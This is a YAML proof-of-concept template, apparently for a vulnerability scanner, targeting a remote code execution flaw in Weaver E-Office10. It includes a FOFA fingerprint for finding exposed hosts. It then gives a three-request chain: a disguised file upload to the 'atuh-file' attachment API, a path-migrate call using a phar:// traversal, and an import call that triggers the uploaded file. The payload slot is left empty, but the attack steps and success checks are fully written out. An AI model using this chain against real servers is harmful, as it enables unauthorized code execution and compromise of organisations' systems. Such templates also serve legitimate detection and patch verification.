id: poc-yaml-weaver-e-office10-atuh-file-rce
info:
  name: 泛微E-Office10 atuh-file 远程代码执行漏洞
  severity: critical
  tags:
  - rce
  finger: e-office10
  fofa: body="/eoffice10"
variables:
  t1: str("")
  payload: base64_decode(t1)
requests:
- method: POST
  path: /eoffice10/server/public/api/attachment/atuh-file
  headers:
    Content-Type: multipart/form-data; boundary=49de7302166055796bdcdc50ba105ddd
  data: '--49de7302166055796bdcdc50ba105ddd

    Content-Disposition: form-data; name="Filedata"; filename="register.inc"

    Content-Type: image/jpeg


    {{.payload}}

    --49de7302166055796bdcdc50ba105ddd--'
  expression: 'status_code == 200 &&

    contains(body,"attachment_id") &&

    contains(body,"attachment_name") &&

    contains(content_type,"application/json")

    '
  output:
  - regex_match(body,`"attachment_id":"(?P<attachment_id>.*?)",`)
- method: POST
  path: /eoffice10/server/public/api/attachment/path/migrate
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: source_path=&desc_path=phar%3A%2F%2F..%2F..%2F..%2F..%2Fattachment%2F
  expression: status_code == 200 && contains(body,"\"status\":1")
- method: POST
  path: /eoffice10/server/public/api/empower/import
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: type=tttt&file={{.attachment_id}}
  expression: status_code == 200 && contains(body,"\"code\":\"no_file\"") && contains(content_type,"application/json")
    && contains(body,"system")
transport: http
